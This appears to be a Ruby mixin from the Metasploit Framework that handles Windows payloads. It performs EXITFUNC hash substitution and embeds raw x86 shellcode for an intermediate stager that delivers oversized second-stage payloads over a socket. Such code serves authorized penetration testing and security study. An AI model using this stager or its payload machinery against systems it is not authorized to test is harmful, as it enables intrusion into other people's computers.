require 'msf/core'

###
#
# This class is here to implement advanced variable substitution
# for windows-based payloads, such as EXITFUNC.  Windows payloads
# are expected to include this module if they want advanced
# variable substitution.
#
###
module Msf::Payload::Windows

	# 
	# ROR hash associations for some of the exit technique routines.
	#
	@@exit_types = 
		{
			'seh'     => 0x5f048af0, # SetUnhandledExceptionFilter
			'thread'  => 0x60e0ceef, # ExitThread
			'process' => 0x73e2d87e, # ExitProcess
		}

	#
	# This mixin is chained within payloads that target the Windows platform.
	# It provides special variable substitution for things like EXITFUNC and
	# automatically adds it as a required option for exploits that use windows
	# payloads.
	#
	def initialize(info = {})
		if (info['Alias'])
			info['Alias'] = 'windows/' + info['Alias']
		end

		# All windows payload hint that the stack must be aligned to nop
		# generators and encoders.
		super(merge_info(info,
			'SaveRegisters' => [ 'esp' ]))

		register_options(
			[
				Msf::OptRaw.new('EXITFUNC', [ true, "Exit technique: #{@@exit_types.keys.join(", ")}", 'seh' ])
			], Msf::Payload::Windows)
	end

	#
	# Replace the EXITFUNC variable like madness
	#
	def replace_var(raw, name, offset, pack)
		if (name == 'EXITFUNC')
			method = datastore[name]
			method = 'seh' if (!method or @@exit_types.include?(method) == false)

			raw[offset, 4] = [ @@exit_types[method] ].pack(pack || 'V')

			return true
		end

		return false
	end

	#
	# For windows, we check to see if the stage that is being sent is larger
	# than a certain size.  If it is, we transmit another stager that will
	# ensure that the entire stage is read in.
	#
	def handle_intermediate_stage(conn, payload)
		return false if (payload.length < 512)

		# The mid-stage works by reading in a four byte length in host-byte
		# order (which represents the length of the stage).  Following that, it
		# reads in the entire second stage until all bytes are read.
		midstager = 
			"\xfc\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x50\x1c\x8b\x12\x8b" +
			"\x72\x20\xad\xad\x4e\x03\x06\x3d\x32\x33\x5f\x32\x75\xef\x8b\x6a" +
			"\x08\x8b\x45\x3c\x8b\x4c\x05\x78\x8b\x4c\x0d\x1c\x01\xe9\x8b\x71" +
			"\x3c\x01\xee\x55\x89\xe3\x6a\x00\x6a\x04\x53\x57\xff\xd6\x2b\x23" +
			"\x66\x81\xe4\xfc\xff\x89\xe5\x55\x6a\x00\xff\x33\x55\x57\xff\xd6" +
			"\x01\xc5\x29\x03\x85\xc0\x75\xf0\xc3"

		# Prepend the stage prefix as necessary, such as a tag that is needed to
		# find the socket
		midstager = (self.stage_prefix || '') + midstager

		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")

		# Transmit our intermediate stager
		conn.put(midstager)

		# Sleep to give enough time for the remote side to receive and read the
		# midstage so that we don't accidentally read in part of the second
		# stage.
		Rex::ThreadSafe.sleep(1.5)
	
		# The mid-stage requires that we transmit a four byte length field that
		# it will use as the length of the subsequent stage.
		conn.put([ payload.length ].pack('V'))

		return true
	end

end
